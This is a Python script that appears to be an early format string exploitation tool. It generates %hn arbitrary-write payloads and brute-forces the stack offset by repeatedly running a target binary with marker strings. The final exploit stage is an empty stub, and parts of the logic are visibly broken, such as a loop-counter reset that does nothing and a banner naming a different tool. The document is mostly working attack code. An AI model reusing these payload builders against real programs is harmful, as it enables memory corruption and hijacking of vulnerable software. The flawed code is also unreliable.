#!/usr/bin/env python3
# coding: utf-8
#
# Made by the Rapace Diabolique
#


from os import access, X_OK, mkfifo
from os.path import realpath, isfile
from io import StringIO
from math import log
from signal import signal, SIGINT
from argparse import ArgumentParser
from subprocess import run, PIPE
from multiprocessing import Process


#
# Version
#
gutenbreg_major = 0
gutenbreg_minor = 1
gutenbreg_bug = 0


#
# Format
#
FMT_CHECK = "x-"
FMT_WRITE = "hn"


#
# Misc
#
MAX_ITER = 1000
FIFO = "/tmp/gutenberg"


def generate_payload(where_to_write, offset, what_to_write=0x00180010, fmt=FMT_WRITE, chr_padd=0):
    nba2hx = lambda x: ''.join(map(chr, (x & 255, (x >> 8) & 255, (x >> 16) & 255, x >> 24)))
    pw1 = (what_to_write & ((255 << 8) + 255)) - 8
    _pw = what_to_write >> 16
    pw2 = 65536 * (_pw <= pw1) + _pw - pw1 - 8
    payload = "{:s}{:s}%{:05d}x%{:d}${:s}%{:05d}x%{:d}${:s}".format(nba2hx(where_to_write),
                                                                nba2hx(where_to_write + 2),
                                                                pw1, offset, fmt,
                                                                pw2, offset + 1, fmt) + " " * chr_padd
    return payload


def exec_cmd_stdin(binary, cmd):
    def _write():
        print(cmd, file=open(FIFO, 'w'))
        pass
    Process(target=_write).start()
    r = run([realpath(binary)], stdin=open(FIFO, 'r'), stdout=PIPE)
    return r.stdout


def exec_cmd_args(binary, cmd):
    r = run([realpath(binary), cmd], stdout=PIPE)
    return r.stdout


def check(binary):
    if not access(binary, X_OK):
        print("[-] Binary can't be executed")
        exit(1)
    else:
        print("[+] File is executable")
    pass


def analyze(binary):
    try:
        if not isfile(realpath(binary)):
            mkfifo(FIFO)
    except OSError as oe:
        print(oe)
        exit(1)

    chr_padd = 0
    for i in range(MAX_ITER):
        payload = generate_payload(0x41414141, i, fmt=FMT_CHECK, chr_padd=chr_padd)
        r = exec_cmd_args(binary, payload)
        if b'4141' in r:
            if r.split(b'-')[0][16:] != b'41414141':
                i = 0
                chr_padd += 1
            else:
                print("WIN", i, r, payload)
                break
    pass


def exploit(binary):
    pass


def main():
    parser = ArgumentParser(description = "Detect and analyse format string exploit")
    parser.add_argument("binary", metavar="binary", help="The binary to analyse")
    # parser.add_argument("-m", "--method", default="both", choices=["args", "stdin", "both"], help="Use specific method") 
    parser.add_argument("-v", "--version", action="store_true", help="Print version number")
    args = parser.parse_args()

    if (args.version):
        print("[+] Pandemic {}.{}.{}".format(gutenbreg_major, gutenbreg_minor, gutenbreg_bug))
        print("[+] Made by the Rapace Diabolique\n")

    signal(SIGINT, signal_handler)

    print("[+] Checking file")
    check(args.binary)
    print("[+] Analyzing file")
    analyze(args.binary)
    print("[+] Running exploit")
    exploit(args.binary)
    print("[+] Exiting")


def signal_handler(signal, frame):
    print("[-] Search cancelled")
    exit(0)


if __name__ == '__main__':
    main()
